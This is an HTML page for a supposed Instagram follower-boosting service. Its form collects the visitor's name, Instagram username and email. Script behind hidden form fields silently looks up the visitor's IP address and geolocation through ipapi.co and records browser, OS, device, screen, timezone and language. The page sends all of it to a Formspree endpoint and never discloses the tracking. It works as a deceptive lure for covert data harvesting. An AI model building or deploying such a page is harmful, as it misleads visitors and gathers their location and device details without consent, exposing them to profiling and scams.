<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Boost Instagram Followers</title>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #0C2D48, #145DA0);
      color: #fff;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 500px;
      margin: 60px auto;
      padding: 30px;
      background-color: rgba(255, 255, 255, 0.07);
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 28px;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: 600;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border: none;
      border-radius: 8px;
      font-size: 15px;
    }
    button {
      margin-top: 25px;
      width: 100%;
      padding: 12px;
      background-color: #2E8BC0;
      color: white;
      border: none;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background-color: #1a5a85;
    }
    .success {
      text-align: center;
      margin-top: 20px;
      color: #14A44D;
      font-weight: bold;
    }
    @media (max-width: 600px) {
      .container {
        margin: 30px 15px;
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>ðŸš€ Boost Your Instagram Followers</h1>
    <form action="https://formspree.io/f/mkgbegdv" method="POST" id="instaForm">
      <label for="name">Your Name</label>
      <input type="text" name="name" id="name" required>

      <label for="insta">Instagram Username</label>
      <input type="text" name="instagram" id="insta" placeholder="@yourusername" required>

      <label for="email">Email</label>
      <input type="email" name="email" id="email" required>

      <!-- Hidden tracking fields -->
      <input type="hidden" name="ip_address" id="ip">
      <input type="hidden" name="browser" id="browser">
      <input type="hidden" name="os" id="os">
      <input type="hidden" name="device" id="device">
      <input type="hidden" name="screen_size" id="screen">
      <input type="hidden" name="platform" id="platform">
      <input type="hidden" name="submitted_at" id="submittedAt">
      <input type="hidden" name="location" id="location">
      <input type="hidden" name="timezone" id="timezone">
      <input type="hidden" name="language" id="language">

      <button type="submit">Submit & Grow ðŸ“ˆ</button>
    </form>
    <div id="result" class="success" style="display:none;">âœ… Submitted! We'll contact you soon.</div>
  </div>

  <script>
    // Fetch IP + Location
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        document.getElementById('ip').value = data.ip;
        document.getElementById('location').value = `${data.city}, ${data.region}, ${data.country_name}`;
      });

    // Detect Browser, OS, Device, Platform, Screen
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const width = screen.width;
    const height = screen.height;

    function getBrowser() {
      if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
      if (ua.includes("Edg")) return "Edge";
      if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
      return "Unknown";
    }

    function getOS() {
      if (platform.includes("Win")) return "Windows";
      if (platform.includes("Mac")) return "macOS";
      if (/Android/.test(ua)) return "Android";
      if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
      if (/Linux/.test(platform)) return "Linux";
      return "Unknown";
    }

    function getDeviceType() {
      return /Mobi|Android/i.test(ua) ? "Mobile" : "Desktop";
    }

    // Set values
    document.getElementById('browser').value = getBrowser();
    document.getElementById('os').value = getOS();
    document.getElementById('device').value = getDeviceType();
    document.getElementById('screen').value = `${width}x${height}`;
    document.getElementById('platform').value = platform;
    document.getElementById('submittedAt').value = new Date().toLocaleString();
    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
    document.getElementById('language').value = navigator.language;

    // Formspree submission
    const form = document.getElementById('instaForm');
    const result = document.getElementById('result');

    form.addEventListener('submit', function (e) {
      e.preventDefault();
      const formData = new FormData(form);
      fetch(form.action, {
        method: 'POST',
        body: formData,
        headers: {
          Accept: 'application/json',
        },
      }).then(response => {
        if (response.ok) {
          result.style.display = 'block';
          form.reset();
        } else {
          alert('Submission failed. Please try again.');
        }
      });
    });
  </script>
</body>
</html>
